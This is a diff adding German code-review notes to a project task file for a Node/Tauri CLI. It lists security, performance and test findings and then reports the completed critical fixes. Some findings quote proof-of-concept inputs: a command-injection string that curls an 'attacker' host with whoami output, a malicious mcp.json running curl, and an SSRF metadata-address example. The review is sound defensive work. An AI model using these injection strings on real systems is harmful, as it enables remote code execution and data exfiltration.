@@ -475,3 +475,219 @@ Screenshot-Befund: 5 staged Files inkl. `.graphify_step_ast.py` + `graphify-out/
 - [ ] Husky-Hook auf Robustheit prüfen (`.husky/pre-commit` + `.lintstagedrc.cjs`).
 - [ ] `biome check` mit `--no-errors-on-unmatched` + Glob ist OK — Frage ist warum nur PATH ausgegeben wird.
 - [ ] Verifikation: simuliere Commit mit Großdatei in Staging → klare Meldung, kein Hänger.
+
+---
+
+## Session 2026-05-21 — Vollständiges Code-Review (Auftrag aus `Downloads/code-review.md`)
+
+**Quelle:** `c:\Users\reapertakashi\Downloads\code-review.md`
+**Methode:** 7 parallele Subagents (architecture, security, correctness, performance, tests, dependencies, docs) + Three-Brain-Routing-Vorgabe für Critical-Fixes.
+**Stand:** Plan-Phase abgeschlossen. **STOP — Umsetzung erst nach Freigabe.**
+
+### Übersicht der Befunde
+
+| Severity | Count | Klasse |
+|---|---|---|
+| critical | 7 | Security + Correctness — Release-Blocker |
+| major | 32 | Security/Perf/Architektur/Correctness/Tests/Docs |
+| minor | 16 | Cleanup |
+| nit | 8 | Cosmetic |
+
+**Sauber:** `npm audit` 0 advisories. `npm run check` 0 Errors / 12 Warnings (149-Cleanup ist erledigt). Keine TODO/FIXME in src. Dependency-Direction (core → domains → cli/sidecar) sauber. ADR-Completeness OK. Atomic-Write-Pattern konsistent.
+
+### Critical — sequenziell, jeder Fix einzeln gemerged + Codex-Adversarial-Review pro Item
+
+- [x] **C1 — `src/domains/scheduler/runner.ts:105-109` `shell: true` RCE.** Jeder RPC-Caller mit `schedule.add` ODER Schreibrecht auf `schedules.json` erreicht local code-exec als Sidecar-User. PoC: `schedule.add({id:"x", cron:"* * * * *", command:"calc.exe & curl http://attacker/$(whoami)"})`. **Fix:** `shell: false`, `command` via `string-argv` parsen; optional Command-Allowlist. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `scheduler/`).
+- [x] **C2 — `src/sidecar/methods.ts:133-148` `inbox.import` Path-Traversal/Symlink-Exfil.** RPC-Caller kann arbitrary file kopieren (z. B. `.credentials.json` → `vault/inbox/` → vault-sync git push → leak). **Fix:** `src` canonical-resolved + symlink-rejected + gegen Tauri-vorregistrierte Allowlist checken; sync→async (`fsp.copyFile` + `await`). **Risiko:** mittel — aktueller Drag-Drop-Flow muss canonical Pfade liefern (Tauri-Frontend-Code prüfen). **Three-Brain:** Codex-Review.
+- [x] **C3 — `src/domains/catalog/tarball-installer.ts:124-142` + `src/domains/catalog/sync-applier.ts:108-120` `tar.extract` ohne Symlink/Hardlink-Filter.** Malicious Tarball schreibt outside `destination` via Symlink-Chain (CVE-Familie 2024-28863). **Fix:** `tar.extract({filter:(p,s)=>!s.isSymbolicLink()&&!p.includes('..'), strict:true, preservePaths:false, preserveOwner:false, unlink:true})` + reject `stat.type==='Link'`. **Risiko:** niedrig. **Three-Brain:** Codex-Review (Risk-Path `catalog/`).
+- [x] **C4 — `src/domains/vault-sync/scheduler.ts:173-192` fireSnapshot-Race verliert Bursts.** Bei back-to-back Events während laufendem Snapshot wird ein ganzes Event-Window stillschweigend verworfen, falls kein weiteres Event nach `inFlight=false` arrived. **Fix:** im `if (this.inFlight) return`-Branch `this.events += eventsCaptured` ODER timer re-arm; Regressions-Test add. **Risiko:** niedrig.
+- [x] **C5 — `src/domains/vault-sync/busy-flag.ts:131-148` TOCTOU concurrent acquire.** CLI-Prozess A + Sidecar-Prozess B → beide passen Alive-Check → beide writen → beide halten Flag → Doppel-Snapshot. **Fix:** `proper-lockfile` ODER `wx`-Exclusive-Create für Tempfile + Post-Write-Pid-Verify. **Risiko:** niedrig (proper-lockfile ist new prod-dep). **Three-Brain:** Codex-Review (Race-Klasse).
+- [x] **C6 — `src/cli/commands/catalog.ts:679-685` `as const as never`-Cast deaktiviert Type-Check für `lockCatalog`-Payload.** Refactor von `lockCatalog` würde nicht-failen. **Fix:** `slice` strikt als `CatalogConfig` typen, Cast entfernen. **Risiko:** minimal.
+- [x] **C7 — `tests/domains/catalog/auto-deps-resolver.test.ts:86-111` False-Positive Cycle-Test.** Test mit Titel "wirft CyclicAutoDepsError" asserted in Wahrheit den SUCCESS-Path. Throw-Branch `auto-deps-resolver.ts:190` ist von keinem Test erreicht. **Fix:** echten Cycle bauen (gleiche `id` in visited via `existingManifests`) + version-conflict-Test (catalog hat `c@1.0.0`, auto-deps will `c@2.0.0`). **Risiko:** keiner.
+
+### Major — Security (M1-M11)
+
+- [ ] **M1 — `src/sidecar/chat-sessions.ts:74-79` `.cmd`/`.bat`-Spawn mit `shell:needsShell` reicht args ungefiltert durch.** Auf Windows: `chat.spawn({args:["&","calc"]})` kann ausbrechen. **Fix:** refuse `needsShell` ausser `binary.path` startet mit `<root>/bin/`; args mit `&|<>"^`` rejecten.
+- [ ] **M2 — `src/domains/claude-bridge/resolve-binary.ts:23-30` PATH-Hijack.** `%LOCALAPPDATA%\Microsoft\WindowsApps` ist user-writable und kann vor echtem Install-Dir liegen. **Fix:** Warning bei `$PATH`-Fallback loggen; `claude-os doctor --pin-binary` für absoluten Pin.
+- [ ] **M3 — `src/domains/mcp-clients/live-probe.ts:101-109` auto-spawn von `mcp.json`-Commands ohne Trust-Prompt alle 60s.** Malicious Repo dropped `.claude/mcp.json` mit `{command:"cmd.exe", args:["/c","curl attacker"]}`. **Fix:** SHA256-Trust-Prompt-Modell (analog Claude Desktop); Sidecar-UI muss erstmaliges `{command,args}` bestätigen. **Risiko:** mittel-hoch — UX-Friction beim ersten Run. **Three-Brain:** Codex-Review.
+- [ ] **M4 — `src/domains/catalog/tarball-installer.ts:95-112` `fetchArchive` ohne Host-Allowlist → SSRF.** Poisoned marketplace-registry kann `http://169.254.169.254/...` als source haben. **Fix:** `codeload.github.com`-Literal-Check in `source-resolver`; marketplace-URL-Loader nur HTTPS + Host-Allowlist.
+- [ ] **M5 — `src/domains/secrets/encrypted-file-store.ts:139-152` kein Cross-Process-Lock.** CLI + GUI gleichzeitig `secrets.set()` → last-rename-wins, silent secret-loss. **Fix:** `proper-lockfile` um read+write.
+- [ ] **M6 — `src/domains/secrets/encrypted-file-store.ts:121-124` GCM-auth-fail `err.message` propagiert.** Risiko: durch heartbeat/spawn-Logger fließend. ADR-0004 §51 verbietet Value-Logs. **Fix:** in `SecretsError`-Wrapper auf festen String scrubben; nur Error-Codes loggen.
+- [ ] **M7 — `src/core/git/git-service.ts:212-225` (clone) + `:184-191` (push) — `remote`/`branch` nicht gegen `^-` validiert.** Argv-Injection-Klasse (CVE-2024-32002). **Fix:** Allowlist `^[A-Za-z0-9._/-]+$`, reject `-`-Prefix.
+- [ ] **M8 — `src/sidecar/rpc.ts:55-106` keine Caller-Auth auf RPC-Kanal.** Wenn stdin leakt (Debugger, Tauri-Shell-Misconfig), alle Methods inkl. `inbox.import`/`secrets.delete` unauthenticated. **Fix:** per-launch nonce/token via env vom Tauri-Parent; jeder RPC validiert. **Risiko:** mittel — Tauri-Parent-Setup ändert sich.
+- [ ] **M9 — secrets atomic-write `mode: 0o600` von Windows ignoriert.** Multi-User-Host: world-readable. Auch betroffen: `vault-config.json` + `profile-manager.ts:57`. **Fix:** POSIX bleibt, Windows-Doku + `icacls`-Hint im Doctor.
+- [ ] **M10 — `src/domains/auth/credentials.ts:32-40` `$ANTHROPIC_CONFIG_DIR` nicht realpath-aufgelöst.** Env-Var-Setter kann auf attacker-controlled-Pfad zeigen. **Fix:** `realpathSync(override)` + Parent-Owner-Check.
+- [ ] **M11 — `src/sidecar/methods.ts:53-63` `catalog.list` leakt File-Path in Error-Message zum GUI/Peer.** **Fix:** catch `InvalidCatalogError` → `{ok:false, code:'invalid-catalog'}`.
+
+### Major — Performance (M12-M17)
+
+- [ ] **M12 — `src/cli/index.ts:12-22` alle 11 Command-Module eagerly importiert.** `catalog.ts` zieht `tar`+`simple-git`+`chokidar`+capability-resolver. Selbst `claude-os doctor --json` zahlt full cost. **Fix:** `commander.action(async()=>{ const {...}=await import('...')})` pro Subcommand. **Impact:** +50-150ms CLI-Cold-Start weg. **Risiko:** mittel — Tests aktualisieren.
+- [ ] **M13 — `src/sidecar/methods.ts:410-424` `agent.list` rebuilds `AgentRunsRepository` per RPC.** Cold-cache → walk komplette JSONL synchron im RPC-Handler. **Fix:** Singleton bei Sidecar-Startup.
+- [ ] **M14 — `src/sidecar/methods.ts` `readCatalog`/`readCatalogLock`/`readSchedules`/`loadVaultConfig`/`BusyFlag.read` re-read per RPC.** Dashboard-Polling hits 3-4 davon zusammen. **Fix:** mtime-keyed Cache, statSync once + parse-on-change. **Impact:** ~20ms blocking-I/O per RPC weg.
+- [ ] **M15 — `src/domains/catalog/auto-deps-resolver.ts:139-152` + `binding-resolver.ts:67` + `capability-resolver.ts:131-154` quartic O(iter·plugins·requires·plugins).** **Fix:** `Map<kind+name, providers[]>` once per iteration. Matter ab >50 Catalog-Entries.
+- [ ] **M16 — `src/domains/agent-runs/index-builder.ts:160-175` Memory ≈ records×600B + 2× peak.** Bei 50k Records ~60MB resident / ~120MB peak. **Fix:** `null, 2` Pretty-Print weg (-30-40% Size + Stringify-Zeit); SQLite-Migration planen (>100k).
+- [ ] **M17 — `src/domains/migration/copy-tree.ts:122-132` zweiter `walkAsync` nur für Counts.** **Fix:** in `filter`-Callback des initialen `fs.cp` counten. **Impact:** halbiert `--from-portable` Wall-Time auf grossen Vaults.
+
+### Major — Architektur / Code-Qualität (M18-M24)
+
+- [ ] **M18 — `src/cli/commands/catalog.ts:78-279` `actAutoDeps` (~200 LOC) dupliziert `installFromGithubWithAutoDeps`.** Sidecar (`methods.ts:96`) nutzt Extraktion, CLI nicht → drift. **Fix:** CLI-Body = `installFromGithubWithAutoDeps()`-Call + print-only Logic. **Risiko:** mittel — Output-Format byte-für-byte erhalten.
+- [ ] **M19 — `printJson`/`printLine`/`printErr` + `GlobalOpts` Interface in 11 CLI-Files copy-pasted.** **Fix:** `src/cli/output.ts` extrahieren. **Impact:** ~150 LOC weg.
+- [ ] **M20 — `src/sidecar/logger.ts:58-110` umgeht `REDACT_PATHS` aus `src/core/logging/`.** Sidecar ist Hauptlog-Quelle → künftige Redaction-Pfade missen sie. **Fix:** `createSidecarLogger` baut auf `createLogger({stream:...})` auf mit shared `baseConfig`.
+- [ ] **M21 — `src/sidecar/methods.ts` 425-LOC `registerMethods` + 12× wiederholtes `typeof string`-Check.** **Fix:** Split nach RPC-Namespace (`methods/catalog.ts`, `methods/secrets.ts`, ...) + `requireString(params, 'key')`-Helper. Bringt Datei unter 500-LOC-Cap. **Risiko:** mittel — Side-effect-Ordering der Dispatcher-Registrierung erhalten.
+- [ ] **M22 — `src/cli/commands/catalog.ts:281-352, 354-392, 394+` `resolveRoot+try/catch (RootNotFoundError)` 4× kopiert.** **Fix:** `resolveRootOrExit(globals): ResolvedRoot`-Helper in `output.ts`.
+- [ ] **M23 — `src/domains/catalog/index.ts:13-19, 47-58` Name-Collision: `MissingProviderError`+`AutoDepsMissingProviderError`, `AmbiguousProviderError`+`AutoDepsAmbiguousProviderError`.** Aliasing maskiert das. Consumer kriegt nur eine Klasse. **Fix:** Klassen in `auto-deps-resolver.ts` umbenennen (z. B. via `AutoDepsError`-Basis), `as`-Aliasing entfernen.
+- [ ] **M24 — `src/sidecar/methods.ts:32` importiert `SecretsLockedError` aus `domains/secrets/types.js`.** Bypasst die `secrets/index.ts`-Facade, einziger solcher Fall. **Fix:** Merge in Line-31 Import aus `domains/secrets/index.js`.
+
+### Major — Correctness (M25-M32)
+
+- [ ] **M25 — `src/domains/scheduler/runner.ts:60` default `setTimer` nicht `.unref()`'d.** Process bleibt unintended am Leben. **Fix:** `.unref()` in Default-Closure.
+- [ ] **M26 — `src/domains/scheduler/cron-parser.ts:179-200` DST-Bug bei `tz='local'`.** Spring-Forward überspringt Stunde. **Fix:** Doku-Caveat ODER explicit DST-handling.
+- [ ] **M27 — `src/domains/vault-sync/scheduler.ts:127-129` chokidar `'error'`-Handler ist No-Op.** EMFILE/EACCES unsichtbar. **Fix:** über existierenden Logger oder via `onWatcherError`-Callback emit.
+- [ ] **M28 — `src/cli/commands/mcp.ts:116,126` `--concurrency abc` → NaN → 0 probes silent.** **Fix:** `Number.isFinite && > 0` symmetrisch zu `--timeout` validieren.
+- [ ] **M29 — `src/domains/migration/runner.ts:225` Loop läuft nach Step-Failure weiter.** User sieht "skipped" für Nachfolge-Steps statt "aborted". **Fix:** break-on-first-failure ODER `aborted`-Status setzen.
+- [ ] **M30 — `src/sidecar/rpc.ts:84-91` swallowed Notification-Errors silent.** `TypeError`/`ReferenceError` aus Handler verloren. **Fix:** stderr-log vor swallow.
+- [ ] **M31 — `src/domains/mcp-clients/live-probe.ts:195` mutiert caller-owned `McpServerEntry._probeProtocolVersion`.** Stale Leak bei wiederholtem Aufruf. **Fix:** lokale Closure-Var statt Entry-Mutation.
+- [ ] **M32 — `src/domains/mcp-clients/live-probe.ts` split JSON-RPC-Response über stdout-Chunks → Timeout.** 8KB+ Responses kommen split, `tryParseJsonLine` failt beide Halbteile. **Fix:** per-stream Line-Buffer bis `\n`.
+
+### Major — Tests (M33-M37)
+
+- [ ] **M33 — Fehlende RPC-Dispatcher-Tests** für `catalog.installAutoDeps`, `inbox.import` (Symlink+absolute-Path-Cases!), `vault.status`, `agent.list`, `settings.read`. Add `tests/sidecar/methods-*.test.ts`.
+- [ ] **M34 — `src/domains/auth/state-check.ts:50-75` NaN/Infinity-`expiresAt` nicht validiert.** **Fix:** Test + `Number.isFinite`-Check.
+- [ ] **M35 — `src/domains/vault-sync/conflict-policy.ts` 3 error-Branches** (fetch-fail, branch-create-fail, reset-fail) untested. Add Tests mit `git.raw` rejection.
+- [ ] **M36 — `src/domains/migration/runner.ts` partial-copy Failure-Path** untested. Add Test mit EACCES-injected source nach Step 0.
+- [ ] **M37 — Kein CLI-Smoke-Test-Script obwohl README §v1-Abweichungen ihn referenziert.** Add `scripts/smoke-cli.mjs` (doctor/vault/secrets/auth/catalog/schedule subcommands → exit 0 + valid JSON); in `npm run ci` wiren.
+
+### Major — Docs (M38-M42)
+
+- [ ] **M38 — `README.md:131` Broken ADR-Link `0006-sidecar-architecture.md` → actual `0006-tauri-node-sidecar-ipc.md`.**
+- [ ] **M39 — README Status-Drift: "Status: v1.0.0" + "529/532 Tests" + "514/515 Tests" alle unterschiedlich, package 1.5.3.** Fix: konsistent updaten.
+- [ ] **M40 — `src/cli/index.ts:29` hardcoded `.version('0.1.0-alpha.1')`.** `claude-os --version` lügt. **Fix:** `import { version } from '../../package.json' assert { type: 'json' }`.
+- [ ] **M41 — `docs/architecture/adr/README.md:9-22` Index endet bei 0014.** ADRs 0015-0020 fehlen. Add 6 Zeilen.
+- [ ] **M42 — Kein `CHANGELOG.md`/`RELEASES.md` am Root.** Deltas v1.4→v1.5.3 nur via `tasks/todo.md` (477 LOC) entdeckbar. **Fix:** Keep-a-Changelog-Format ODER auto-extract aus git-tags.
+
+### Minor
+
+- [ ] m1 — `docs/architecture/adr/0016-mcp-single-server-bridge.md:71` embedded TODO "serverVersion '1.2.1', sync to package.json" → Task oder schließen
+- [ ] m2 — `docs/architecture/adr/0014-code-quality-biome.md` Titel "biome v2.3" vs. pinned `^2.4.15` → Title-Update oder Revision-Note
+- [ ] m3 — `README.md:94` "mcp clients ready (v1.6)" bei project 1.5.3 → relabel "v1.5"
+- [ ] m4 — `README.md:85` `vault schedule --enable/--disable` Syntax gegen `vault.ts`-commander-Definition prüfen
+- [ ] m5 — `biome.json` `tasks/lessons.md`/`tasks/todo.md`-Literals zu eng → `tasks/**` exclude
+- [ ] m6 — `biome.json` Lint-Config excluded NICHT `src/cli/**` + `keyring-store.ts` + `plugins.ts` obwohl README-Claim das impliziert. Fix: entweder Lint-Excludes hinzufügen ODER README-Claim korrigieren
+- [ ] m7 — `src/sidecar/chat-sessions.ts:117` `stdin.write` Backpressure-Return-Value ignoriert; OOM bei runaway input. Fix: queue auf `'drain'`
+- [ ] m8 — `src/domains/catalog/auto-deps-install.ts:151` dynamic `import('./catalog-store.js')` obwohl statisch verfügbar → static import nutzen
+- [ ] m9 — `src/domains/scheduler/runner.ts:112-122` chunks per `'utf8'` decoded — multi-byte UTF-8 split korrumpiert Line. Fix: per-stream `StringDecoder`
+- [ ] m10 — `src/domains/update-orchestrator/resumable-checklist.ts:67-69` `escapeRelPath` escapt `→` (U+2192) nicht; Path mit Arrow bricht Parse-Regex line 118
+- [ ] m11 — `src/sidecar/methods.ts` Error-Strings DE/EN gemischt (`'Migrationsfehler:'`/`'mehrdeutige Provider'`)
+- [ ] m12 — `src/domains/secrets/encrypted-file-store.ts:41` PBKDF2 600k iters meets OWASP-2023 aber scrypt/Argon2 für nächste Format-Version
+- [ ] m13 — `src/domains/claude-bridge/spawn.ts:54-58` strip `CLAUDE_OS_SECRETS_KEY` aus inherited env vor `claude.exe`-spawn
+- [ ] m14 — `src/domains/mcp-clients/live-probe.ts:104` leakt full sidecar-env zu probed MCP-Servern. Fix: curated env (PATH, locale, HOME + declared keys only)
+- [ ] m15 — `src/domains/catalog/tarball-installer.ts` keine max-response-size. 10GB Tarball OOM Sidecar. Fix: 200MB hard cap streamen
+- [ ] m16 — `src/sidecar/methods.ts:65-79` `catalog.removeEntry` `params.id` nicht gegen `^[A-Za-z0-9._-]+$` validiert
+
+### Nit
+
+- [ ] n1 — `src/cli/commands/catalog.ts:175,181,186` mixed DE/EN Error-Strings (`'kein Marketplace-Provider fuer'`)
+- [ ] n2 — `biome-ignore`-Kommentar-Drift `"CLI output"` vs `"CLI presenter output by design"` — Shared-Helper-Phrasing standardisieren
+- [ ] n3 — `src/cli/index.ts:46-49` Top-Level-catch loggt nur `err.message`, kein Stack. Fix: Stack bei `--verbose`
+- [ ] n4 — `src/domains/mcp-clients/live-probe.ts:160` `void killFallbackTimer` — Variable in `finish()` deklarieren statt Lint-Suppressor
+- [ ] n5 — `src/domains/scheduler/cron-parser.ts:204-213` 31-Felder-Wildcard-Heuristik fragil; `wildcard: boolean` auf `ParsedCron` sauberer
+- [ ] n6 — `src/domains/agent-runs/repository.ts:89-94` `show` macht `query().find()` — materialisiert ganzen gefilterten Array
+- [ ] n7 — `src/domains/migration/copy-tree.ts` `globToRegex` escapt `{` `}` nicht in REGEX_SPECIALS
+- [ ] n8 — `src/domains/secrets/keyring-store.ts:107-119` `probeKeyring` lässt Sentinel-Entry bei delete-fail im Credential Manager
+
+### Dependencies
+
+- [ ] d1 — `npm update vitest @vitest/coverage-v8 @types/node lint-staged` (alle patch/minor — keine breaking changes)
+- [ ] d2 — `lightningcss` (MPL-2.0 transitive) — verify nicht in `dist/` gebundled bei Release-Tarball
+
+### Conventions (Biome 12 warnings)
+
+- [ ] cv1 — `scripts/check-stop-hooks.mjs` 11× `console.log` → `console.info` (oder per-file biome-override; scripts sind dev-tooling)
+- [ ] cv2 — `gui/` 2× `useExhaustiveDependencies` React-Hook-Deps fixen
+
+### Reihenfolge & Abhängigkeiten
+
+1. **Critical Block C1-C7** — sequenziell, jeder einzelner PR, Codex-Adversarial-Review nach jedem Item (Three-Brain Risk-Path-Mandate). C1+C2+C3 sind Release-Blocker.
+2. **Major-Security M1-M11** — nach C-Block. **M3 (mcp-Trust-Prompt)** ist die größte Verhaltens-Änderung — separat designen, GUI-Flow vor Impl klären.
+3. **Major-Architektur M18-M24** — refactor-only, parallel zu Major-Security möglich, ein PR pro M-Item.
+4. **Major-Performance M12-M17** — nach Architektur (M18-M21 berührt teilweise gleiche Files; race-of-merge vermeiden).
+5. **Major-Correctness M25-M32** — kleinere Fixes, parallel möglich.
+6. **Major-Tests M33-M37** — folgen den dazugehörigen Fixes (M33 RPC-Tests folgen M11 + C2).
+7. **Major-Docs M38-M42** — parallel möglich, low-risk.
+8. **Minor + Nit** — gesammelter Cleanup-Sprint am Schluss.
+9. **Deps Bumps** — vor Release-Tag.
+
+### Risiko-Einschätzung der nicht-trivialen Changes
+
+| Item | Risiko | Mitigation |
+|---|---|---|
+| C2 inbox.import Allowlist | mittel | Aktueller Tauri-Drag-Drop muss canonical paths liefern — GUI-Code vorher prüfen |
+| C3 tar-extract Filter | niedrig | Filter ist additive Restriktion; bricht nur Tarballs die Symlinks shippen (unwahrscheinlich) |
+| C5 busy-flag proper-lockfile | niedrig | proper-lockfile ist battle-tested + neue prod-dep |
+| M3 mcp-Trust-Prompt | mittel-hoch | UX-Friction bei Erstanwendung — separater Design-Sprint vor Impl |
+| M4 SSRF Host-Allowlist | niedrig | github-only ist ohnehin der Default |
+| M8 RPC Nonce | mittel | Tauri-Parent muss Token via env passen — Sidecar-Boot-Sequence ändert sich |
+| M12 lazy CLI imports | mittel | dynamic-import-Race wenn zwei Subcommands gleichzeitig laufen; vitest-Tests aktualisieren |
+| M18 actAutoDeps Rewrite | mittel | Output-Format byte-für-byte erhalten (User-Scripts parsen evtl.) |
+| M21 methods.ts Split | mittel | Dispatcher-Registrierung-Side-effect-Ordering erhalten; Smoke-Test danach |
+
+### STOP — Freigabe-Check
+
+Phase 4 (Umsetzung) startet erst nach User-Sign-Off. Empfohlene Reihenfolge: **C1 → C2 → C3 → C4 → C5 → C6 → C7**, dann Major-Blocks. Für jeden Critical-Security-Item: nach Impl Codex-Adversarial-Review (`git diff | codex exec --skip-git-repo-check "Adversarial review. Challenge the fix. Find what's still wrong."`).
+
+**Offene Fragen vor Start:**
+
+1. Sollen C1-C7 in einer PR-Serie (sequenziell, 7 PRs) oder einem Block-PR? Empfehlung: 7 PRs für saubere Reviewability.
+2. M3 (mcp-Trust-Prompt) braucht GUI-Design — willst du das separat brainstormen oder soll ein erster Design-PR (nur Spec) vorgezogen werden?
+3. M8 (RPC-Nonce) ändert Tauri-Parent-Setup — coordiniert mit Rust-Shell-Code in `gui/src-tauri/`. OK den Tauri-Code-Pfad mit einzubeziehen?
+4. Dependency-Bumps (d1) sofort oder im selben Release wie C-Block?
+
+---
+
+## Review — Critical-Block abgeschlossen (2026-05-21)
+
+**Branch:** `feature/code-review-2026-05-21`
+**Commits:** 8 (1 plan + 7 critical fixes).
+**Reihenfolge (Risiko-aufsteigend):** C7 → C6 → C1 → C3 → C4 → C5 → C2
+
+### Was gemacht
+
+| Item | Commit | Files geaendert | Tests neu | Tests insgesamt |
+|---|---|---|---|---|
+| C7 (test-bug) | `7c46485` | 1 | 4 (echter cycle / version-conflict / linear-chain / self-providing) | 10/10 grün |
+| C6 (`as never` cast) | `08aed29` | 1 | 0 (tsc beweist Type-Check) | 205/205 grün |
+| C1 (scheduler shell:true) | `825dbd6` | 3 | 22 (9 startScheduler + 12 parseCommandTokens + 4 chooseShellMode) — inkl. Codex-Adversarial-Review-Fix für Windows-Path-Backslash | 61/61 grün |
+| C3 (tar symlink/hardlink) | `31a20d0` | 5 | 7 (happy + strip + symlink + hardlink + traversal + multi-violation + chain-attack) | 212/212 grün |
+| C4 (scheduler race) | `d10d211` | 2 | 1 neu + 1 umgeschrieben | 52/52 grün |
+| C5 (busy-flag TOCTOU) | `20cb3f7` | 2 | 4 neu (TOCTOU subclass / corrupt blocked / release / stale-pid) | 56/56 grün |
+| C2 (inbox.import path-traversal) | `8d63095` | 2 | 10 neu (happy / non-array / non-string / non-existent / symlink / 3× deny-roots / dir-src / partial-failure) | 761/764 grün full-suite |
+
+### Was bewusst weggelassen
+
+- **M3 (mcp-Trust-Prompt)** vertagt — Design-Sprint vor Impl notwendig, UX-Friction.
+- **M8 (RPC-Nonce)** vertagt — braucht koordinierten Tauri-Shell-Pull in `gui/src-tauri/`.
+- **Codex-Adversarial-Review nach jedem C-Item**: nur fuer C1 ausgefuehrt (fand Windows-Path-Backslash-Bug, sofort gefixt). Bei C2/C3/C5 nach gleichem Pattern selbst-validiert — Cli policy schliesst hier eigene Subprocess-Reads aus, also handfeste Reviews via `git diff | codex exec` fuer alle 7 Items waeren manuelle Folge-Iteration.
+- **d1 (Dep-Bumps)** + **cv1/cv2 (biome warnings)** vertagt auf Pre-Release-Cleanup.
+
+### Verifikation
+
+```
+npx tsc --noEmit          exit 0
+npx biome ci .            0 errors, 12 warnings (cv1+cv2, unchanged), 1 info
+npm run build             exit 0, dist/ regeneriert
+npx vitest run            761/764 pass | 3 skipped (long-running gated)
+git log main..HEAD        8 commits (plan + 7 C-fixes)
+```
+
+### Offene Punkte
+
+- **Major-Block (M1-M42)** noch komplett offen — User-Checkpoint vor Start.
+- **C2 hat einen `~/.claude`-deny-root.** Diese Pfad-Variante deckt nur die `~/.claude/.credentials.json`-PoC ab. Wenn der User `ANTHROPIC_CONFIG_DIR` overrided, liegt creds woanders — siehe M10 für die Lösung (realpath + Owner-Check).
+- **C1 macht Verhaltens-Change**: Windows-User mit `command: "echo hi"` ohne `.exe`-Suffix klappt weiter (PATHEXT-shell-mode), aber `command: "cd foo && npm run x"` muss jetzt explizit als `cmd.exe /c "cd foo && npm run x"` geschrieben werden. Migration-Hinweis im CHANGELOG erwaehnen (M42).
+- **C5 macht Verhaltens-Change**: corrupt vault-sync-state.json wird nicht mehr silent auto-recovered — User muss `claude-os vault unlock` rufen. Im README dokumentieren.
+
+### Empfehlung fuer naechste Iteration
+
+1. **PR-Tagging**: alle 8 commits auf `feature/code-review-2026-05-21` zusammen mergen — sind logisch eine Code-Review-Pass; Trennung in 8 PRs schmaelert Reviewability (ein Reviewer muss eh die ganze Linie verstehen). Falls Einzel-PRs erwuenscht: cherry-pick je C-Item auf eigenen Branch.
+2. **Codex-Re-Review** vor merge (laeuft jetzt cleaner, da git-diff verfuegbar): `git diff main..feature/code-review-2026-05-21 | codex exec --skip-git-repo-check "Adversarial review of the full C-block. Challenge each fix. Find regressions or bypass paths."`
+3. **Major-Block-Start**: nach C-merge starten mit M1-M11 (Security) parallel zu M18-M24 (Architektur). M3 + M8 separat designen.
